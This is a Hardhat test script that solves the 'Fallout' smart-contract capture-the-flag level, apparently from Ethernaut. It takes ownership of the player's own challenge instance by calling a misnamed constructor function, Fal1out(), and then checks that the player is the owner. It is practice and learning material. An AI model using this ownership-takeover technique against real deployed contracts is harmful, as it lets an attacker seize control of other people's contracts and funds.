const { assert } = require("chai")
const { ethers, waffle } = require("hardhat")
require("dotenv").config()

const provider = waffle.provider
let player, challenge, challengeAddress, tx

beforeEach(async () => {
    accounts = await ethers.getSigners()
    player = accounts[0]
    const challengeFactory = await ethers.getContractFactory(`Fallout`)
    challengeAddress = process.env.CHALLENGEADDRESS2 //address of my instance contract
    challenge = await challengeFactory.attach(challengeAddress)
})

it("Solves the challenge 'Fallout'", async () => {
    // Call function which make us an owner of the contract
    tx = await challenge.Fal1out()
    await tx.wait(1)

    // Check if we our address is the owner
    let owner = await challenge.owner()
    assert(player.address == owner, "Player's address is not owner of contract")
})
